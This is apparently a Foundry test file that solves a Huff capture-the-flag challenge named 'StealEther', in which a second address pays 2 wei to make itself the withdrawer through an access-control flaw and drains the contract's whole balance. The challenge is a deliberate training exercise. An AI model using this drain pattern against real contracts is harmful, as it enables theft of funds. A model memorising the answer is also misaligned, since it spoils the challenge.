// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.15;

import "foundry-huff/HuffDeployer.sol";
import "forge-std/Test.sol";
import "forge-std/console.sol";

contract StealEtherTest is Test {
    StealEther public instance;

    function setUp() public {
        instance = StealEther(HuffDeployer.deploy("huff-challenges/StealEther"));
    }

    function test() public {
        instance.deposit{value: 0.1 ether}();
        assertEq(address(instance).balance, 0.1 ether);

        address alice = makeAddr("ab");
        vm.deal(alice, 1 ether);
        vm.startPrank(alice);
        instance.deposit{value: 0.1 ether}();
        console.log(uint160(alice));
        instance.setWithdrawer{value: 2}(alice);
        instance.withdraw();

        assertEq(address(instance).balance, 0 ether);
        assertEq(alice.balance, 1.1 ether);
    }
}

interface StealEther {
    function deposit() external payable;
    function withdraw() external;
    function setWithdrawer(address) external payable;
}
